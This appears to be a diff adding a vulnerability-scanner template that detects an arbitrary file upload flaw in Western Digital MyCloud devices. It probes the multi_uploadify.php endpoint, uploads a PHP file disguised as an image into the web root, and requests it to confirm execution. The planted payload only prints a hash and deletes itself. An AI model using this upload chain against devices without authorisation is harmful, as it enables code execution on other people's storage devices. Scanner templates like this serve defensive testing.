@@ -1,0 +1,57 @@
+id: westerndigital-mycloud-file-upload
+info:
+  name: Western Digital MyCloud Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects an arbitrary file upload vulnerability in Western Digital MyCloud devices via the multi_uploadify.php endpoint.
+
+variables:
+  f1: '{{rand_int(40000, 44800)}}'
+  rboundary: '{{rand_text_alpha(8)}}'
+  randname: '{{rand_text_alpha(6)}}'
+
+http:
+  - id: check-upload-endpoint
+    method: GET
+    path:
+      - '{{BaseURL}}/web/jquery/uploader/multi_uploadify.php?status=1'
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "status=1"
+
+  - id: upload-malicious-file
+    method: POST
+    path:
+      - '{{BaseURL}}/web/jquery/uploader/multi_uploadify.php?folder=/var/www/'
+    headers:
+      Content-Type: 'multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}'
+    body: |
+      ------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name="Filedata[]"; filename="{{randname}}.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo md5({{f1}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}--\r\n
+    redirects: false
+    matchers:
+      - type: status
+        status:
+          - 302
+
+  - id: verify-file-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/{{randname}}.php'
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{md5(f1)}}'
